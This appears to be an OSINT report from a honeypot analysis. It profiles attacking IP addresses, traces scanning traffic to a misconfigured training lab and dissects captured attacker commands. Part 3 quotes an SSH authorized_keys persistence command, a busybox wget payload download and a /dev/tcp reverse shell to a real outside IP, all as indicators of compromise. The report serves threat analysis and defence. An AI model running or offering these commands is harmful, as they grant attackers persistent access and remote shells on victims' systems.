# Comprehensive OSINT Investigation Report

This report consolidates the open-source intelligence gathered on the top IP addresses, hostnames, and commands identified during the honeypot analysis.

---

### **Part 1: IP Address Intelligence**

#### **1.1. IP Address: 20.2.136.52**
*   **Ownership:** Microsoft Corporation (Microsoft Azure)
*   **Geographical Location:** Hong Kong
*   **Abuse History:** Extremely high. **626 abuse reports** from 199 distinct sources. Listed on multiple threat intelligence feeds including IPsum and MalwareWorld.
*   **Activities:** Port Scanning, Brute-Force Attacks.
*   **Assessment:** **Unequivocally Malicious.** This is a compromised or maliciously provisioned Azure cloud server being used as a dedicated platform for widespread, opportunistic cyberattacks. The intent is criminal.

#### **1.2. IP Address: 176.65.141.117**
*   **ISP/Hosting Provider:** Optibounce, LLC (US) / Go Host Ltd (UK)
*   **Geographical Location:** Germany
*   **Abuse History:** Flagged in multiple threat intelligence feeds. The surrounding network range is heavily associated with the **Mirai botnet family**.
*   **Activities:** Brute-force attacks, DDoS attacks, credential stuffing.
*   **Assessment:** **High confidence of malicious intent.** Likely part of a botnet infrastructure used for large-scale automated attacks.

#### **1.3. IP Address: 86.54.42.238**
*   **ISP/Hosting Provider:** Global-Data System IT Corporation
*   **Geographical Location:** Seychelles
*   **Abuse History:** Significant history of abuse. Listed on the **Spamhaus Project blacklist**, including the Spamhaus Block List (SBL) and the Exploits Block List (XBL).
*   **Activities:** Spam, Port Scanning.
*   **Assessment:** **High confidence of malicious intent.** The Spamhaus listing indicates involvement in distributing malicious emails and malware, and association with hijacked systems.

#### **1.4. IP Address: 45.234.176.18**
*   **ISP/Hosting Provider:** Mafredine Telecomunicações EIR
*   **Geographical Location:** Brazil
*   **Abuse History:** Reported for **SSH brute-force attacks**.
*   **Activities:** Consistent with large-scale campaigns originating from Brazil, often leveraging compromised routers and IoT devices. These are typically precursors to deploying cryptominers or expanding botnets.
*   **Assessment:** **High confidence of malicious intent.** Actively involved in brute-force campaigns to gain initial access to systems.

#### **1.5. IP Address: 15.235.131.242**
*   **ISP/Hosting Provider:** OVH SAS
*   **Geographical Location:** France or Singapore
*   **Abuse History:** No public abuse reports found. Associated with hostnames `olivia.cocks.lab.go4labs.net` and `leonard.flowers.lab.go4labs.net`.
*   **Activities:** High-volume scanning of multiple ports, particularly SMB (445).
*   **Assessment:** **Unintentional / Non-Malicious.** The high volume of traffic is anomalous but linked to a legitimate cybersecurity training lab. The activity is likely from a misconfigured lab exercise.

---

### **Part 2: Hostname Intelligence**

#### **2.1. Hostnames: `olivia.cocks.lab.go4labs.net` & `leonard.flowers.lab.go4labs.net`**
*   **Associated Domain:** `go4labs.net`
*   **Purpose:** The domain and its subdomains are used for a **hands-on technical training and lab environment**, primarily for Forcepoint cybersecurity products.
*   **Associated Individuals:** The names "Olivia Cocks" and "Leonard Flowers" are **pseudonyms or randomly generated placeholders** for anonymous users in the training lab. There are no verifiable public links between individuals with these names and Forcepoint.
*   **Conclusion:** These hostnames are part of a legitimate, non-malicious training platform. The "attack" traffic from the associated IP was unintentional. Abuse reports have been generated to inform Forcepoint and the hosting provider (OVH) of the misconfiguration.

---

### **Part 3: Command & Payload Analysis**

#### **3.1. Command Pattern: SSH Key Persistence**
*   **Command:** `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3... mdrfckr" >> .ssh/authorized_keys`
*   **Objective:** To establish persistent, passwordless access to a compromised system.
*   **Analysis:** This is a critical post-exploitation technique. The specific SSH key, with the comment "mdrfckr," is a well-known Indicator of Compromise (IOC) associated with the **"Outlaw" hacking group** and the **"Dota3" malware family**. This allows attackers to maintain long-term control for use in cryptomining and other botnet activities.

#### **3.2. Command Pattern: Embedded System Payload Delivery**
*   **Command:** `cd /data/local/tmp/; rm *; busybox wget http://<IP>/<filename>`
*   **Objective:** To download and execute malware on Android and other embedded Linux systems (e.g., IoT devices).
*   **Analysis:** This pattern targets world-writable temporary directories on embedded devices. It uses `busybox wget` to download payloads.
    *   **Payloads (`arm.urbotnetisass`, `w.sh`):** The payloads are typically shell scripts (`w.sh`) that act as droppers for ELF binaries. The binaries (`urbotnetisass`) are compiled for specific architectures (e.g., ARM) and are variants of known IoT botnets like **Mirai** and **Gafgyt**.

#### **3.3. Command Pattern: Reverse Shell**
*   **Command:** `nohup bash -c "exec 6<>/dev/tcp/8.219.12.33/60118 && ..."`
*   **Objective:** To establish a reverse shell, giving the attacker direct command-line access.
*   **Analysis:** This is a more sophisticated technique to create a direct TCP connection to a command-and-control (C2) server. It is stealthier than binding a shell to a port and indicates a more advanced botnet or an active attacker.

---
### **Overall OSINT Conclusion**

The investigation has successfully differentiated between genuinely malicious actors and non-malicious, but disruptive, network activity. The majority of top attackers are part of established malicious infrastructure, abusing legitimate hosting and cloud services to launch widespread, automated attacks. Their methods are consistent and clear: gain initial access via brute-force or exploits, establish persistence using known malicious SSH keys, and deploy IoT botnet malware.

Conversely, the high-volume traffic from IP `15.235.131.242` has been confidently attributed to a misconfigured cybersecurity training lab, and appropriate steps have been taken to report this to the responsible parties.
